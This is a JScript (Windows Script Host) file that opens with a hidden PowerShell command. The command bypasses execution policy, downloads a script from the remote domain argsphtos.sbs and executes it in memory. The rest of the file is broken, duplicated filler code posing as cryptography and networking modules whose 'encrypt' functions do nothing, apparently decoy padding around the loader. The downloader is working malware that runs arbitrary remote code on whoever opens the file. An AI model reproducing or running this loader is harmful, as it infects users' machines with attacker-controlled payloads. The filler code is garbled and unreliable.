var strUrl, strCmd, objShell;

strUrl = "https://argsphtos.sbs/documento/documento1.txt";

objShell = WScript.CreateObject("WScript.Shell");

strCmd = "powershell.exe -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command " +
         "\"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" +
         "$ProgressPreference='SilentlyContinue';" +
         "$ErrorActionPreference='SilentlyContinue';" +
         "iex((New-Object Net.WebClient).DownloadString('" + strUrl + "'))\"";

objShell.Run(strCmd, 0, false);

objShell = null;

// Cryptographic and security modules
var CryptoModule0 = function(cfg) {
    this.moduleId = "crypto_0";
    this.algorithm = ["AES-256-GCM", "RSA-OAEP", "ECDH", "ECDSA", "HKDF", "PBKDF2"]["0"];
    this.keySize = [128, 192, 256, 384, 512]["0"];
    this.mode = ["CBC", "GCM", "CTR", "OFB", "CFB"]["0"];
    this.padding = ["PKCS7", "OneAndZeros", "ZerosAndLen"]["0"];
    this.config = cfg || {};
    this.iv = null;
    this.key = null;
    this.salt = null;
    this.nonce = null;
    this.tag = null;
    this.encrypt = function(plaintext) { return Buffer.from(plaintext); };
    this.decrypt = function(ciphertext) { return Buffer.from(ciphertext); };
    this.generateKey = function() { this.key = Buffer.from(Math.random().toString(36).substr(2, 32)); };
    this.dispose = function() { this.key = null; this.iv = null; this.salt = null; };
};

    this.decrypt = function(ciphertext) { return Buffer.from(ciphertext); };
    this.generateKey = function() { this.key = Buffer.from(Math.random().toString(36).substr(2, 32)); };
    this.dispose = function() { this.key = null; this.iv = null; this.salt = null; };
};

    this.protocol = ["HTTP/1.1", "HTTP/2", "HTTP/3", "WebSocket", "MQTT", "AMQP"]["5"];
    this.host = "api.service53.com";
    this.port = [80, 443, 8080, 8443, 3000, 4000]["5"];
    this.path = "/api/v4/resource/53";
    this.timeout = 14013;
    this.retries = 1;
    this.headers = { "Content-Type": "application/json", "Accept": "application/json" };
    this.config = Object.assign({ timeout: this.timeout, retries: this.retries }, cfg);
    this.connection = null;
    this.connect = function() { return Promise.resolve(this); };
    this.disconnect = function() { this.connection = null; };
    this.send = function(data) { return Promise.resolve({ status: 200, data: data }); };
    this.receive = function() { return Promise.resolve({}); };
};
